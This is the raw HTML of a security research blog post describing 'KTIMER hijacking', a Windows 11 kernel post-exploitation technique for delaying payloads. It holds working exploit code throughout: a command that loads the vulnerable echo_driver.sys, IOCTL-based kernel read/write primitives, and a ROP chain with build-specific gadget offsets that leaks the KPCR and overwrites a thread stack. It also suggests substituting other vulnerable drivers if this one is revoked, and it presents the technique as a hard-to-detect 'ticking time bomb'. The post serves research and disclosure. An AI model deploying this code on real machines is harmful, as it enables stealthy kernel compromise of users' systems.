hijack. Next, we rerun the proof of concept setting the DueTime 24 hours from the time we set the hijack and see that it did not trigger a BSOD within these 24 hours. As a result, we conclude that PatchGuard is probably fine with our hijack.\nThanks We gave a practical proof of concept of KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads. With KTIMER hijacking you can call any legit DPC routine or function pointer with kCFG and HVCI enabled, however, for arbitrary code execution kCFG has to be disabled. The proof of concept is HVCI compliant, so with an eventual kCFG bypass, or a system wide disable of kCFG during the KernelForge phase, “ticking time bombs” can be planted on modern Windows 11 builds.\nThanks for taking the time to read this post. If you have any questions or remarks, reach out to me on X or Discord.\n","wordCount":"4652","inLanguage":"en","image":"https://gar-re.github.io/posts/ktimer-hijack-pt2/cover.png","datePublished":"2023-09-30T00:00:00Z","dateModified":"2023-09-30T00:00:00Z","author":{"@type":"Person","name":"Gary"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://gar-re.github.io/posts/ktimer-hijack-pt2/"},"publisher":{"@type":"Organization","name":"Gar Reversing","logo":{"@type":"ImageObject","url":"https://gar-re.github.io/favicon.ico"}}}</script>
+</head>
+<body class=dark id=top>
+<script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove('dark')</script>
+<header class=header>
+<nav class=nav>
+<div class=logo>
+<a href=https://gar-re.github.io/ accesskey=h title="Gar Reversing (Alt + H)">
+<img src=https://gar-re.github.io/gar-re_logo.png alt aria-label=logo height=35>Gar Reversing</a>
+<div class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</div>
+</div>
+<ul id=menu>
+<li>
+<a href=https://gar-re.github.io/contact/ title=Contact>
+<span>Contact</span>
+</a>
+</li>
+<li>
+<a href=https://gar-re.github.io/disclosure-policy/ title="Disclosure Policy">
+<span>Disclosure Policy</span>
+</a>
+</li>
+<li>
+<a href=https://gar-re.github.io/archives/ title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://gar-re.github.io/tags/ title=Tags>
+<span>Tags</span>
+</a>
+</li>
+</ul>
+</nav>
+</header>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<h1 class=post-title>
+Delaying Kernel Payloads by Hijacking KTIMERs & KDPCs (Part 2)
+</h1>
+<div class=post-meta><span title="2023-09-30 00:00:00 +0000 UTC">September 30, 2023</span>&nbsp;·&nbsp;22 min&nbsp;·&nbsp;Gary
+</div>
+</header>
+<figure class=entry-cover>
+<img loading=lazy srcset="https://gar-re.github.io/posts/ktimer-hijack-pt2/cover_hu27e1e1ddfd458a3503adbd6ca43c8349_160408_360x0_resize_box_3.png 360w ,https://gar-re.github.io/posts/ktimer-hijack-pt2/cover_hu27e1e1ddfd458a3503adbd6ca43c8349_160408_480x0_resize_box_3.png 480w ,https://gar-re.github.io/posts/ktimer-hijack-pt2/cover_hu27e1e1ddfd458a3503adbd6ca43c8349_160408_720x0_resize_box_3.png 720w ,https://gar-re.github.io/posts/ktimer-hijack-pt2/cover_hu27e1e1ddfd458a3503adbd6ca43c8349_160408_1080x0_resize_box_3.png 1080w ,https://gar-re.github.io/posts/ktimer-hijack-pt2/cover_hu27e1e1ddfd458a3503adbd6ca43c8349_160408_1500x0_resize_box_3.png 1500w ,https://gar-re.github.io/posts/ktimer-hijack-pt2/cover.png 2680w" sizes="(min-width: 768px) 720px, 100vw" src=https://gar-re.github.io/posts/ktimer-hijack-pt2/cover.png alt width=2680 height=560>
+</figure><div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#introduction aria-label=Introduction>Introduction</a></li>
+<li>
+<a href=#byovd-arw-echoh-no aria-label="BYOVD ARW: EchOh-No!">BYOVD ARW: EchOh-No!</a></li>
+<li>
+<a href=#kpcr-using-kernelforge aria-label="KPCR using KernelForge">KPCR using KernelForge</a><ul>
+<li>
+<a href=#1-dummy-thread aria-label="1. Dummy Thread">1. Dummy Thread</a></li>
+<li>
+<a href=#2-kthread aria-label="2. KTHREAD">2. KTHREAD</a></li>
+<li>
+<a href=#3-return-address-on-thread-stack aria-label="3. Return Address on Thread Stack">3. Return Address on Thread Stack</a></li>
+<li>
+<a href=#4-kpcr-rop-chain aria-label="4. KPCR ROP Chain">4. KPCR ROP Chain</a></li>
+<li>
+<a href=#5-triggering-the-rop-chain aria-label="5. Triggering the ROP Chain">5. Triggering the ROP Chain</a></li></ul>
+</li>
+<li>
+<a href=#ktimer-hijack aria-label="KTIMER Hijack">KTIMER Hijack</a><ul>
+<li>
+<a href=#ktimer-traverse aria-label="KTIMER traverse">KTIMER traverse</a></li>
+<li>
+<a href=#dpc-decryption aria-label="DPC Decryption">DPC Decryption</a></li>
+<li>
+<a href=#arbitrary-kernelmode-routine-rop-chain aria-label="Arbitrary Kernelmode Routine ROP chain">Arbitrary Kernelmode Routine ROP chain</a><ul>
+<li>
+<a href=#finding-a-code-cave aria-label="Finding a Code Cave">Finding a Code Cave</a></li>
+<li>
+<a href=#replacing-deferredroutine-with-stackpivot aria-label="Replacing DeferredRoutine with Stackpivot">Replacing DeferredRoutine with Stackpivot</a></li>
+<li>
+<a href=#aligning-rsp aria-label="Aligning RSP">Aligning RSP</a></li>
+<li>
+<a href=#calling-ntdbgprintex aria-label="&amp;ldquo;Calling&amp;rdquo; nt!DbgPrintEx">&ldquo;Calling&rdquo; nt!DbgPrintEx</a></li>
+<li>
+<a href=#restoring-the-execution-flow aria-label="Restoring the Execution Flow">Restoring the Execution Flow</a></li></ul>
+</li>
+<li>
+<a href=#setting-the-duetime aria-label="Setting the DueTime">Setting the DueTime</a></li></ul>
+</li>
+<li>
+<a href=#the-proof-is-in-the-pudding aria-label="The Proof is in the Pudding">The Proof is in the Pudding</a></li>
+<li>
+<a href=#a-note-on-patchguard aria-label="A Note on PatchGuard">A Note on PatchGuard</a></li>
+<li>
+<a href=#thanks aria-label=Thanks>Thanks</a>
+</li>
+</ul>
+</div>
+</details>
+</div>
+<div class=post-content><p>In this two part blog post series we present KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads.
+In the first part whe focussed on Windows 11 timer internals and deferred procedure calls and showed that we can hijack <code>KTIMER</code> and <code>KDCP</code> objects to delay the execution of a function pointer. This second part focusses on implementing these findings in a proof of concept, illustrating the delay in execution of a kernel-mode payload.</p>
+<h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2>
+<p>In the context of Proof of Concept or Get The F*ck Out (PoC||GTFO) we present a proof of concept implementation of <a href=../ktimer-hijack-pt1/>KTIMER hijacking</a>.
+Similarly to getting code execution by e.g. hijacking a kernel mode routine, KTIMER hijacking results in arbitrary code execution, but in a delayed manner (and periodic if necessary). This means that a &ldquo;ticking time bomb&rdquo; could live in the Windows kernel whilst the kernel exploit process is already terminated, making it harder to detect.
+Additionally, no Page Table Entries (PTE) have to be modified as the <code>KDPC</code> and <code>KTIMER</code> objects are already writeable, making it abide by the rules that HVCI has set.</p>
+<p>For the proof of concept, we bring our own vulnerable driver (BYOVD), <a href=https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/>echo_driver.sys</a> discovered by Protocol (<a href=https://x.com/WindowsKernel>@WindowsKernel</a>) which has a write-up <a href=https://ioctl.fail/echo-ac-writeup/>here</a>.
+The vulnerable driver allows us to obtain an arbitrary read write (ARW) in the kernel, which was the prerequisite in the research from <a href=../ktimer-hijack-pt1/>part 1</a>.
+From the ARW we use the <a href=https://github.com/Cr4sh/KernelForge>KernelForge technique</a> by Dmytro Oleksiuk (<a href=https://x.com/d_olex>@d_olex</a>) to obtain the pointer to the <code>KPCR</code>.
+This technique is HVCI compliant.
+With the <code>KPCR</code> pointer, we traverse to the <code>KPRCB</code> and <code>TimerTable</code>, eventually searching for the <code>KTIMER</code> object that represents the <code>nt!ExpCenturyDpcRoutine</code>.
+We decrypt the <code>DPC</code>, search for a code cave and a stackpivot that returns there and set up a ROP chain that executes an arbitrary API call (<code>nt!DbgPrintEx</code>).
+We make sure that the ROP chain restores the execution flow before hijacking the <code>DeferredRoutine</code> with our stackpivot and <code>DueTime</code> with a value of our choosing.</p>
+<p>We use the most recent Windows 11 22H2 <a href=https://support.microsoft.com/en-gb/topic/august-8-2023-kb5029263-os-build-22621-2134-f8d4d3de-47c1-40e1-a2e6-97c2770ee2e8>(22621.2134, August 2023)</a> at the time of our research as our target machine with default exploit mitigations in place but disabling HVCI if enabled.
+This is because HVCI will activate kCFG which will disallow the execution the hijacked <code>DeferredRoutine</code> as became clear in <a href=../ktimer-hijack-pt1/>part 1</a>.
+We make sure that the rest of the exploit is HVCI compliant, with an eventual kCFG bypass, KTIMER hijacking is also possible on machines that have HVCI enabled.</p>
+<p>The proof of concept code can be found on <a href=https://github.com/gar-re/ktimer_hijack/blob/main/ktimer_hijack.cpp>GitHub</a>.</p>
+<p>Let&rsquo;s start!</p>
+<h2 id=byovd-arw-echoh-no>BYOVD ARW: EchOh-No!<a hidden class=anchor aria-hidden=true href=#byovd-arw-echoh-no>#</a></h2>
+<p>First, we have to meet the prerequisite that we have set in the research: an arbitrary read write (ARW) in the kernel.
+For this we use <a href=https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/>echo_driver.sys</a>, for which the vulnerability details were published 14th of July 2023 by Protocol (<a href=https://x.com/WindowsKernel>@WindowsKernel</a>).
+Details of the vulnerability can be found in the <a href=https://ioctl.fail/echo-ac-writeup/>write-up</a>.
+It is known that Microsoft does a bad job at revoking the certificates of vulnerable drivers, hence, the <a href=https://www.loldrivers.io/drivers/afb8bb46-1d13-407d-9866-1daa7c82ca63/>echo_driver.sys</a> still loads on our target Windows 11 22H2.
+If for whatever reason the certificate of this driver gets revoked by Microsoft, just try another from <a href=https://www.loldrivers.io/>Living Off The Land Drivers</a> that yields you an ARW.
+We load the driver with the following command:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bat data-lang=bat>sc.exe create echo_driver.sys binPath=C:\windows\temp\echo_driver.sys type=kernel &amp;&amp; sc.exe start echo_driver.sys
+</code></pre></div><p>Next, we open a handle to the driver and initialize it as per the <a href=https://ioctl.fail/echo-ac-writeup/>details of the vulnerability</a>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>HANDLE hDriver <span style=color:#f92672>=</span> CreateFile(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>.</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>EchoDrv&#34;</span>, GENERIC_READ <span style=color:#f92672>|</span> GENERIC_WRITE, FILE_SHARE_READ <span style=color:#f92672>|</span> FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
+<span style=color:#66d9ef>if</span> (hDriver <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE) {
+  printf(<span style=color:#e6db74>&#34;[!] Error while opening a handle to the driver: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, GetLastError());
+  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+printf(<span style=color:#e6db74>&#34;[+] Successfully obtained the handle to EchoDrv used for Kernel ARW: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, hDriver);
+
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>initDriver(hDriver)) {
+  printf(<span style=color:#e6db74>&#34;[!] Error initializing the driver: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, GetLastError());
+  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+}
+</code></pre></div><p>The initialization includes a single <code>DeviceIoControl()</code> call with IOCTL 0x9e6a0594 to bypass an internal check.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>/**
+</span><span style=color:#75715e>* Initializes the EchoDrv
+</span><span style=color:#75715e>*/</span>
+BOOL <span style=color:#a6e22e>initDriver</span>(HANDLE hDriver) {
+	LPVOID buf <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>4096</span>);
+
+	<span style=color:#75715e>//Call IOCTL that sets the PID variable and gets past the DWORD check
+</span><span style=color:#75715e></span>	BOOL success <span style=color:#f92672>=</span> DeviceIoControl(hDriver, <span style=color:#ae81ff>0x9e6a0594</span>, NULL, NULL, buf, <span style=color:#ae81ff>4096</span>, NULL, NULL);
+	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>success) {
+		printf(<span style=color:#e6db74>&#34;[!] DeviceIOControl 0x9e6a0594 failed: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, GetLastError());
+		CloseHandle(hDriver);
+		<span style=color:#66d9ef>return</span> NULL;
+	}
+
+	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
+}
+</code></pre></div><p>After initialization we can use the IOCTL 0x60a26124 which will make the driver execute <code>MmCopyVirtualMemory()</code>, allowing us to read and write from kernel virtual memory.
+We define two functions <code>read64()</code> and <code>write64()</code> which reads or writes QWORDS at specific addresses.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>ARW</span> {
+	HANDLE targetProcess;
+	LPVOID fromAddress;
+	LPVOID toAddress;
+	DWORD length;
+	LPVOID padding;
+	DWORD returnCode;
+};
+
+<span style=color:#75715e>/**
+</span><span style=color:#75715e>* Reads DWORD64 from &#34;where&#34; in virtual memory
+</span><span style=color:#75715e>*/</span>
+DWORD64 <span style=color:#a6e22e>read64</span>(HANDLE hProcess, HANDLE hDriver, DWORD64 where) {
+	LPVOID lpWhat <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(DWORD64));
+	
+  ARW arw{};
+	arw.fromAddress <span style=color:#f92672>=</span> (LPVOID)where;
+	arw.length <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8</span>;
+	arw.targetProcess <span style=color:#f92672>=</span> hProcess;
+	arw.toAddress <span style=color:#f92672>=</span> lpWhat;
+
+	DeviceIoControl(hDriver, <span style=color:#ae81ff>0x60a26124</span>, <span style=color:#f92672>&amp;</span>arw, <span style=color:#66d9ef>sizeof</span>(ARW), <span style=color:#f92672>&amp;</span>arw, <span style=color:#66d9ef>sizeof</span>(ARW), NULL, NULL);
+	<span style=color:#66d9ef>return</span> ((DWORD64<span style=color:#f92672>*</span>)lpWhat)[<span style=color:#ae81ff>0</span>];
+}
+
+<span style=color:#75715e>/**
+</span><span style=color:#75715e>* Writes DWORD64 &#34;what&#34; to DWORD64 &#34;where&#34; in virtual memory
+</span><span style=color:#75715e>*/</span>
+VOID <span style=color:#a6e22e>write64</span>(HANDLE hProcess, HANDLE hDriver, DWORD64 where, DWORD64 what) {
+	LPVOID lpWhat <span style=color:#f92672>=</span> calloc(<span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(DWORD64));
+	((DWORD64<span style=color:#f92672>*</span>)lpWhat)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> what;
+
+	ARW arw{};
+	arw.fromAddress <span style=color:#f92672>=</span> lpWhat;
+	arw.length <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8</span>;
+	arw.targetProcess <span style=color:#f92672>=</span> hProcess;
+	arw.toAddress <span style=color:#f92672>=</span> (LPVOID)where;
+	
+  DeviceIoControl(hDriver, <span style=color:#ae81ff>0x60a26124</span>, <span style=color:#f92672>&amp;</span>arw, <span style=color:#66d9ef>sizeof</span>(ARW), <span style=color:#f92672>&amp;</span>arw, <span style=color:#66d9ef>sizeof</span>(ARW), NULL, NULL);
+}
+</code></pre></div><h2 id=kpcr-using-kernelforge>KPCR using KernelForge<a hidden class=anchor aria-hidden=true href=#kpcr-using-kernelforge>#</a></h2>
+<p>Now that we can read and write to kernel memory, we can start KTIMER hijacking by first leaking the <code>TimerTable</code> address.
+Some kernel vulnerabilities allow us to leak the <code>KPCR</code> or some pointer inside the <code>KPCR</code>/<code>KPRCB</code> directly, however, the driver we chose only grants us an ARW.
+There have been <a href=http://scudette.blogspot.com/2012/10/finding-kpcr-in-memory-images.html>some attempts</a> to heuristically find the <code>KPCR</code> but we decided that we wanted a fool-proof method of finding it.
+We chose the <a href=https://github.com/Cr4sh/KernelForge>KernelForge technique</a> by Dmytro Oleksiuk (<a href=https://x.com/d_olex>@d_olex</a>).
+This technique is described in detail in a <a href=https://connormcgarr.github.io/hvci/>blog post</a> by Connor McGarr (<a href=https://twitter.com/33y0re>@33y0re</a>) and allows us to execute a ROP chain abiding by the rules that HVCI has set (HVCI compliant).</p>
+<p>The KernelForge technique boils down to the following steps:</p>
+<ol>
+<li>Create a &ldquo;dummy&rdquo; thread in a suspended state using <code>CreateThread()</code>;</li>
+<li>Get the <code>KTHREAD</code> object of the thread using <code>NtQuerySystemInformation()</code>;</li>
+<li>Locate the return address of <code>nt!KiApcInterrupt+0x35c</code> on the thread stack;</li>
+<li>Write a ROP chain that ends with an API call to nt!ZwTerminateThread to gracefully continue;</li>
+<li>Resume the dummyThread to trigger the ROP chain.</li>
+</ol>
+<p>We explain these steps one by one.</p>
+<h3 id=1-dummy-thread>1. Dummy Thread<a hidden class=anchor aria-hidden=true href=#1-dummy-thread>#</a></h3>
+<p>The kernel typically chooses CPU 0 to run DPCs as it&rsquo;s the timekeeping processor that will always be active to pick up clock interrupts.
+This means that, when we leak the <code>KPCR</code> - which is a per-processor structure - we want to leak it from CPU 0.
+As a result, we have to make sure that the &ldquo;dummy&rdquo; thread also executes on CPU 0.
+We can set the thread affinity mask to 0x1 using <code>SetThreadAffinityMask()</code> to enforce running the thread on CPU 0 after we have created the thread using <code>CreateThread()</code>.</p>
+<p>We write a <code>dummyFunction()</code> and <code>createdummyThread()</code> which creates the thread in a suspended state and sets the thread affinity mask.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>/**
+</span><span style=color:#75715e>* Dummy function used to spawn dummy thread
+</span><span style=color:#75715e>*/</span>
+<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>dummyFunction</span>() {
+	<span style=color:#66d9ef>return</span>;
+}
+
+<span style=color:#75715e>/**
+</span><span style=color:#75715e>* Creates a dummy thread used in the KernelForge technique
+</span><span style=color:#75715e>*/</span>
+HANDLE <span style=color:#a6e22e>createdummyThread</span>() {
+	HANDLE dummyThread <span style=color:#f92672>=</span> CreateThread(NULL, <span style=color:#ae81ff>0</span>, (LPTHREAD_START_ROUTINE)dummyFunction, NULL, CREATE_SUSPENDED, NULL);
+
+	<span style=color:#66d9ef>if</span> (dummyThread <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE) {
+		<span style=color:#66d9ef>return</span> NULL;
+	}
+
+	SetThreadAffinityMask(dummyThread, <span style=color:#ae81ff>0x1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>0</span>); <span style=color:#75715e>//use first processor that contains the TimerTable
+</span><span style=color:#75715e></span>	<span style=color:#66d9ef>return</span> dummyThread;
+}
+</code></pre></div><p>We call it as such:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// 1) Create a &#34;dummy&#34; thread in a suspended state using CreateThread
+</span><span style=color:#75715e></span>HANDLE dummyThread <span style=color:#f92672>=</span> createdummyThread();
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>dummyThread) {
+  printf(<span style=color:#e6db74>&#34;[!] Error creating dummy thread</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  <span style=color:#66d9ef>return</span> NULL;
+}
+printf(<span style=color:#e6db74>&#34;[+] Created dummy thread: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, dummyThread);
+</code></pre></div><h3 id=2-kthread>2. KTHREAD<a hidden class=anchor aria-hidden=true href=#2-kthread>#</a></h3>
+<p>Now that we have created the thread in a suspended state on CPU 0 we can leak the <code>KTHREAD</code> object using <code>NtQuerySystemInformation()</code>.
+We won&rsquo;t go into detail for this technique as it has been documented many times.
+For a good reference see Connor&rsquo;s <a href=https://connormcgarr.github.io/hvci/>blog post</a>.</p>
+<p>We use the following code.
+For the <code>getKThread()</code> function see the code on <a href=https://github.com/gar-re/ktimer_hijack/blob/main/ktimer_hijack.cpp>GitHub</a>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// 2) Get the KTHREAD object for the thread using NtQuerySystemInformation
+</span><span style=color:#75715e></span>PVOID kThread <span style=color:#f92672>=</span> getKThread(dummyThread);
+<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>kThread) {
+  printf(<span style=color:#e6db74>&#34;[!] Error getting KTHREAD address</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+  <span style=color:#66d9ef>return</span> NULL;
+}
+printf(<span style=color:#e6db74>&#34;[+] KTHREAD at: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, kThread);
+</code></pre></div><h3 id=3-return-address-on-thread-stack>3. Return Address on Thread Stack<a hidden class=anchor aria-hidden=true href=#3-return-address-on-thread-stack>#</a></h3>
+<p>With the <code>KTHREAD</code> we search for the return address of <code>nt!KiApcInterrupt+0x35c</code> on the thread stack which is at <code>nt + 0x43703c</code> on our target build.
+This is a return address on the thread stack which returns into the kernel, meaning that if we overwrite the stack at that location with a ROP chain, it will execute the ROP gadgets in the kernel.
+Again, for elaboration check out Connor&rsquo;s <a href=https://connormcgarr.github.io/hvci/>blog post</a>.</p>
+<p>The following code searches for the target return address:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// 3) Locate the return address of nt!KiApcInterrupt+0x35c on the thread stack
+</span><span style=color:#75715e></span>DWORD64 kThreadStackBase <span style=color:#f92672>=</span> (DWORD64)kThread <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x38</span>;
+DWORD64 stackBase <span style=color:#f92672>=</span> read64(hProcess, hDriver, kThreadStackBase);
+printf(<span style=color:#e6db74>&#34;[+] stackBase at: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, stackBase);
+
+DWORD64 retAddr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+
+<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x8</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x7000</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x8</span>; i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>0x8</span>) {
+  ULONG64 value <span style=color:#f92672>=</span> read64(hProcess, hDriver, stackBase <span style=color:#f92672>-</span> i);
+
+  <span style=color:#66d9ef>if</span> ((value <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfffff00000000000</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xfffff00000000000</span>) {
+    <span style=color:#75715e>// nt!KiApcInterrupt+0x35c?
+</span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x43703c</span>) {
+      retAddr <span style=color:#f92672>=</span> stackBase <span style=color:#f92672>-</span> i;
+      printf(<span style=color:#e6db74>&#34;[+] Stack address of nt!KiApcInterrupt+0x35c: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, retAddr);
+      <span style=color:#66d9ef>break</span>;
+    }
+  }
+  value <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+}
+</code></pre></div><h3 id=4-kpcr-rop-chain>4. KPCR ROP Chain<a hidden class=anchor aria-hidden=true href=#4-kpcr-rop-chain>#</a></h3>
+<p>Now that we the address of the thread stack we can start building our ROP chain that retrieves the <code>KPCR</code>.
+Conveniently, the kernel includes a specific gadget that exactly does this: <code>nt!KeGetPcr: mov rax, gs:[0x18]; ret;</code>.
+The base address for <code>gs</code> is loaded from the processor’s Model Specific Register (MSR) 0xC0000102, which the kernel initializes with the address of the processor’s <code>KPCR</code> (<a href=https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/kpcr.htm>source</a>).
+At <code>KPCR + 0x18</code> the <code>KPCR</code> holds the self reference, thus at <code>gs:[0x18]</code>.</p>
+<p>Refer to the ROP chain below.
+We write <code>nt!KeGetPcr</code> to the target return address and start our ROP chain there.
+When the address to the <code>KPCR</code> is stored in rax we pop a user-mode address in rcx before writing rax (<code>KPCR</code>) to that user-mode address.
+Afterwards, we end the ROP chain with a return into <code>nt!ZwTerminateThread</code> to gracefully continue execution terminating the thread.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>// 4) Write our ROP chain that uses nt!KeGetPcr to write the KPCR to our usermode address.
+</span><span style=color:#75715e>//      We end the ROP chain with an API call to nt!ZwTerminateThread to gracefully continue.
+</span><span style=color:#75715e></span>DWORD64 kPCR <span style=color:#f92672>=</span> NULL;
+
+write64(hProcess, hDriver, retAddr, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3d73a0</span>);       <span style=color:#75715e>// nt!KeGetPcr (mov rax, gs:[0x18]; ret;)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x8</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20c721</span>); <span style=color:#75715e>// 0x14020c721: pop rcx ; ret  ;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>, (DWORD64)<span style=color:#f92672>&amp;</span>kPCR);
+write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x209d0d</span>); <span style=color:#75715e>// 0x140209d0d: mov qword [rcx], rax ; ret  ;  (1 found)
+</span><span style=color:#75715e></span>
+write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x20c721</span>); <span style=color:#75715e>// 0x14020c721: pop rcx ; ret  ;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>, (DWORD64)dummyThread);
+write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x30</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x3275f2</span>); <span style=color:#75715e>// 0x1403275f2: pop rdx; ret;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x38</span>, <span style=color:#ae81ff>0x0</span>);
+write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x40</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2038f5</span>); <span style=color:#75715e>// 0x1402038f5: pop rax ; ret  ;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, retAddr <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x48</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x42dfc0</span>); <span style=color:#75715e>// nt!ZwTerminateThread
